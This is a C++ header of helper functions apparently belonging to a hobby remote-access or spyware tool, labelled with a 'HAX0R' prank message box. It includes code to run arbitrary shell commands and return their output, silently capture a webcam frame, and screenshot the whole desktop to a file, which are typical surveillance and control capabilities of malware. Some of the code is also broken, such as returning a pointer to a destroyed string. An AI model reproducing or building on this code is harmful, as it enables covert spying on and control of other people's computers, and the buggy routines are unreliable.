#ifndef H_UTILS
#define H_UTILS

namespace utils {
  void fireHax0r(){
    MessageBox(
        GetForegroundWindow(),
        "Hacking la vida loca",
        "HAX0R",
        MB_ICONWARNING | MB_OK
        );
  }

  void startup(LPCTSTR lpApplicationName) {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory( &si, sizeof(si) );
    si.cb = sizeof(si);
    ZeroMemory( &pi, sizeof(pi) );

    if (CreateProcess( lpApplicationName,   // the path
          NULL,        // Command line
          NULL,           // Process handle not inheritable
          NULL,           // Thread handle not inheritable
          FALSE,          // Set handle inheritance to FALSE
          0,              // No creation flags
          NULL,           // Use parent's environment block
          NULL,           // Use parent's starting directory
          &si,            // Pointer to STARTUPINFO structure
          &pi             // Pointer to PROCESS_INFORMATION structure (removed extra parentheses)
          ) != 0) {
      CloseHandle( pi.hProcess );
      CloseHandle( pi.hThread );
    }
  }

  char * exec(const char* cmd) {
    char buffer[256];
    std::string result = "";
    FILE* pipe = _popen(cmd, "r");
    if (pipe == NULL) return "ERROR utils::exec";

    while (!feof(pipe)) {
      if (fgets(buffer, 256, pipe) != NULL) result += buffer;
    }
    _pclose(pipe);

    return (char*)result.c_str();
  }

  void captureWebcam(char *path) {
    HWND hwndVideo = capCreateCaptureWindow("WCW",
        NULL,
        0, 0,
        640, 480,
        GetForegroundWindow(),
        0);

    capDriverConnect(hwndVideo,0);
    capGrabFrame(hwndVideo);
    capFileSaveDIB(hwndVideo, path);

    DestroyWindow(hwndVideo);
    hwndVideo = NULL;
  }

  char * TakeScreenShot(char *path) {
    HWND sh = GetDesktopWindow();
    if (sh == NULL) {
      printf("ERROR\n");
    }

    RECT rc;
    GetWindowRect(sh, &rc);

    HDC hdcScreen = GetDC(sh);
    HDC hdc = CreateCompatibleDC(hdcScreen);
    HBITMAP hbmp = CreateCompatibleBitmap(hdcScreen, rc.right, rc.bottom);
    SelectObject(hdc, hbmp);

    printf("\n point: %d %d, point: %d %d\n", rc.left, rc.top, rc.right, rc.bottom);
    BitBlt(hdc, 0, 0, rc.right, rc.bottom, hdcScreen, 0, 0, SRCCOPY );

    BITMAP bmpScreen;
    BITMAPFILEHEADER bmfHeader;
    BITMAPINFOHEADER bi;

    GetObject(hbmp, sizeof(BITMAP), &bmpScreen);

    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = bmpScreen.bmWidth;
    bi.biHeight = bmpScreen.bmHeight;
    bi.biPlanes = 1;
    bi.biBitCount = 32;
    bi.biCompression = BI_RGB;
    bi.biSizeImage = 0;
    bi.biXPelsPerMeter = 0;
    bi.biYPelsPerMeter = 0;
    bi.biClrUsed = 0;
    bi.biClrImportant = 0;

    DWORD dwBmpSize = ((bmpScreen.bmWidth * bi.biBitCount + 31) / 32) * 4 * bmpScreen.bmHeight;
    HANDLE hDIB = GlobalAlloc(GHND, dwBmpSize);
    char *lpbitmap = (char *)GlobalLock(hDIB);

    GetDIBits(hdcScreen, hbmp, 0,
        (UINT)bmpScreen.bmHeight,
        lpbitmap,
        (BITMAPINFO *)&bi, DIB_RGB_COLORS);

    HANDLE hFile = CreateFile(path,
        GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL, NULL);

    DWORD dwSizeofDIB = dwBmpSize + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    bmfHeader.bfOffBits = (DWORD)sizeof(BITMAPFILEHEADER) + (DWORD)sizeof(BITMAPINFOHEADER);
    bmfHeader.bfSize = dwSizeofDIB;
    bmfHeader.bfType = 0x4D42; //BM

    DWORD dwBytesWritten = 0;
    WriteFile(hFile, (LPSTR)&bmfHeader, sizeof(BITMAPFILEHEADER), &dwBytesWritten, NULL);
    WriteFile(hFile, (LPSTR)&bi, sizeof(BITMAPINFOHEADER), &dwBytesWritten, NULL);
    WriteFile(hFile, (LPSTR)lpbitmap, dwBmpSize, &dwBytesWritten, NULL);

    CloseHandle(hFile);

    GlobalUnlock(hDIB);
    DeleteObject(hbmp);
    ReleaseDC(NULL, hdcScreen);
    DeleteDC(hdcScreen);

    return lpbitmap;
  }
}

#endif
